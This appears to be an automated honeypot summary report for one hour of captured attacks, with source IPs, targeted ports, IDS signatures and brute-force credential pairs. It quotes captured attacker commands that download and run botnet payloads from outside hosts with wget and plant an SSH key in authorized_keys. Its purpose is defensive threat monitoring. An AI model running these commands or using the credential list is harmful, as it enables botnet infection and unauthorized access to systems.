# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-25T00:01:26Z
**Timeframe of Analysis:** 2025-10-24T23:20:02Z to 2025-10-25T00:00:02Z
**Log Files Used:**
- `agg_log_20251024T232002Z.json`
- `agg_log_20251024T234001Z.json`
- `agg_log_20251025T000002Z.json`

## Executive Summary

This report summarizes 13,664 attacks recorded over the past hour. The most targeted services were related to VoIP (SIP), SSH, and VNC. A significant portion of the attacks originated from a small number of IP addresses, suggesting targeted attacks or botnet activity. The most common attack vectors were brute-force login attempts and exploitation of known vulnerabilities.

## Detailed Analysis

### Attacks by Honeypot

- **Cowrie:** 4124
- **Honeytrap:** 4080
- **Suricata:** 2342
- **Ciscoasa:** 1887
- **Sentrypeer:** 552
- **Heralding:** 296
- **Mailoney:** 126
- **H0neytr4p:** 86
- **Tanner:** 61
- **Adbhoney:** 35
- **Dionaea:** 29
- **Redishoneypot:** 16
- **ElasticPot:** 12
- **ConPot:** 9
- **Dicompot:** 7
- **Honeyaml:** 2

### Top Attacking IPs

- **80.94.95.238:** 1709
- **194.113.236.217:** 742
- **124.155.125.131:** 703
- **222.124.17.227:** 308
- **101.47.5.97:** 297
- **185.156.174.178:** 280
- **107.170.36.5:** 253
- **155.94.170.106:** 202
- **27.110.166.67:** 184
- **77.83.207.203:** 164
- **193.24.211.28:** 161
- **198.23.190.58:** 146
- **167.250.224.25:** 140
- **200.225.246.102:** 120
- **23.94.38.226:** 117
- **68.183.149.135:** 111
- **23.94.26.58:** 108
- **45.136.68.49:** 89
- **14.225.253.26:** 70
- **130.83.245.115:** 64

### Top Targeted Ports/Protocols

- **5060 (SIP):** 552
- **22 (SSH):** 440
- **vnc/5900 (VNC):** 296
- **8333 (Bitcoin):** 221
- **5903 (VNC):** 144
- **25 (SMTP):** 126
- **5901 (VNC):** 115
- **443 (HTTPS):** 78
- **5904 (VNC):** 78
- **5905 (VNC):** 77
- **80 (HTTP):** 53
- **5908 (VNC):** 52
- **5909 (VNC):** 52
- **5907 (VNC):** 51
- **5902 (VNC):** 41
- **23 (Telnet):** 35
- **TCP/22 (SSH):** 28
- **TCP/5432 (PostgreSQL):** 20
- **2323 (Telnet):** 19
- **9500:** 17

### Most Common CVEs

- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-1999-0183

### Commands Attempted by Attackers

- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `which ls`
- `crontab -l`
- `w`
- `uname -m`
- `cat /proc/cpuinfo | grep model | grep name | wc -l`
- `top`
- `uname`
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
- `Enter new UNIX password:`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`
- `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; ...`
- `chmod +x setup.sh; sh setup.sh; ...`
- `cd /data/local/tmp/; busybox wget http://netrip.ddns.net/w.sh; ...`

### Signatures Triggered

- **ET SCAN MS Terminal Server Traffic on Non-standard Port:** 1018
- **ET DROP Dshield Block Listed Source group 1:** 350
- **ET SCAN NMAP -sS window 1024:** 184
- **ET HUNTING RDP Authentication Bypass Attempt:** 115
- **ET INFO Reserved Internal IP Traffic:** 59

### Users / Login Attempts

- `345gs5662d34/345gs5662d34`
- `root/Efecti331--.--111111`
- `root/Efecti331--.--N3tw0rk119!!`
- `root/Egylinksys411977`
- `root/Egysa`
- `keycloak/keycloak123`
- `keycloak/3245gs5662d34`
- `wwwuser/wwwuser123`
- `datadog/datadog`
- `root/Ej1m3n3z86`
- `huwei/huwei`
- `huwei/3245gs5662d34`
- `aps/aps123`
- `wm/wm`
- `root/ekjb83hrzx`
- `sunny/3245gs5662d34`
- `skynet/skynet`
- `mgmt/mgmt123`
- `maintain/maintain`
- `skaner/skaner123`
- `skaner/3245gs5662d34`

### Files Uploaded/Downloaded

- `wget.sh;`
- `arm.urbotnetisass;`
- `arm.urbotnetisass`
- `arm5.urbotnetisass;`
- `arm5.urbotnetisass`
- `arm6.urbotnetisass;`
- `arm6.urbotnetisass`
- `arm7.urbotnetisass;`
- `arm7.urbotnetisass`
- `x86_32.urbotnetisass;`
- `x86_32.urbotnetisass`
- `mips.urbotnetisass;`
- `mips.urbotnetisass`
- `mipsel.urbotnetisass;`
- `mipsel.urbotnetisass`
- `w.sh;`
- `c.sh;`
- `soap-envelope`
- `addressing`
- `discovery`
- `env:Envelope>`

### HTTP User-Agents

- *No user agents recorded in this timeframe.*

### SSH Clients and Servers

- *No specific SSH clients or servers recorded in this timeframe.*

### Top Attacker AS Organizations

- *No AS organization data recorded in this timeframe.*

## Key Observations and Anomalies

- **High Volume of VNC Scans:** A large number of scans targeting various VNC ports (5900-5909) were observed. This suggests a widespread campaign to find and exploit unsecured VNC servers.
- **Botnet-like Activity:** The commands attempted by attackers, particularly the `wget` and `curl` commands to download and execute scripts from various IP addresses, are indicative of botnet activity.
- **Targeting of VoIP:** The high number of attacks on port 5060 (SIP) suggests a continued interest in compromising VoIP systems, likely for the purpose of making fraudulent calls or launching other attacks.
- **Repetitive Commands:** The frequent use of commands to gather system information (`uname`, `lscpu`, `free`, etc.) and manipulate SSH authorized keys suggests a common toolkit being used by multiple attackers.
